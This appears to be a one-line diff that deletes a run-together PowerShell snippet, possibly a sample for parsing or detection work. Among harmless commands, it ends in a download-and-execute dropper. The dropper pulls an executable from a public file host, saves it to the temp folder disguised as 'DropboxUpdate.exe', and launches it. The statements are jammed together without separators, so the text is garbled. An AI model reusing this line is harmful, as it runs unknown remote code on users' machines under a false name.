@@ -1,1 +1,0 @@
-function My-Function ($myInput){My-Function $myInput}$things = 4$thingsMy-Function $thingsWrite-Output "Hello World";Get-ChildItemgcidirWrite-HostGet-ChildItem(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/dwnysn.exe',"$env:TEMP\DropboxUpdate.exe");Start-Process ("$env:TEMP\DropboxUpdate.exe")
